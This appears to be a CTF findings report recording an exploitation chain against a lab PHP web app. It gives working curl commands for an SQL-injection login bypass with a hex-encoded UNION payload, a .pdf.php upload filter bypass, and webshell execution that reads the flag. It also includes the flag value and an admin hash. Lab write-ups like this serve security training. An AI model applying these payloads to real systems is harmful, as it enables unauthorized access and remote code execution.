findings.title: CTF Flag Extracted via SQLi + File Upload Chain
findings.description: Full exploitation chain: (1) Boolean-based Blind SQLi in username parameter with second-order injection via UNION SELECT hex-encoded payload, bypassing the PHP session auth. (2) File upload filter bypass using '.pdf.php' double extension (server checks if '.pdf' exists anywhere in filename via strstr/strpos, not that it ends with .pdf). (3) PHP webshell uploaded to /uploaded_invoices/webshell.pdf.php and executed to read /FLAG.txt.

reproduction.command:
# Step 1: Login bypass via second-order SQLi
curl -c /tmp/cookies.txt -X POST http://172.17.0.1:43309/index.php --data-urlencode "username=nonexistent' UNION SELECT 0x61646d696e27204f52202731273d2731#" -d "password=wrongpass1&submit=submit"

# Step 2: Upload PHP webshell
curl -b /tmp/cookies.txt -F "invoice=@shell.pdf.php;filename=webshell.pdf.php;type=application/pdf" http://172.17.0.1:43309/upload.php

# Step 3: Read flag
curl http://172.17.0.1:43309/uploaded_invoices/webshell.pdf.php?cmd=cat+/FLAG.txt

findings.title: Boolean-based Blind SQLi in Login Username Parameter
findings.description: Login form vulnerable to Boolean-based Blind SQL injection and second-order injection via UNION SELECT. Two-query auth flow allows injecting hex-encoded SQL payload as username to bypass password check.
findings.evidence: Login bypass payload: nonexistent' UNION SELECT 0x61646d696e27204f52202731273d2731# -> Success. DB: payroll_db, admin hash: 7d39307ae824e70052c0aa16816a9b16

findings.title: File Upload Extension Bypass - .pdf.php Double Extension Webshell
findings.description: The file upload handler checks if the filename contains '.pdf' anywhere (strstr/strpos) rather than verifying the extension ends with .pdf. Uploading 'webshell.pdf.php' passes the PDF check while Apache executes it as PHP. Combined with authenticated session from SQLi bypass, this enables full RCE.
findings.evidence: Upload: POST /upload.php with filename=webshell.pdf.php -> File is successfully uploaded to /uploaded_invoices/. Execution: GET /uploaded_invoices/webshell.pdf.php?cmd=id -> uid=33(www-data). Flag: flag{376613a6-2168-4f1c-9cbf-9c21d08cc41f}
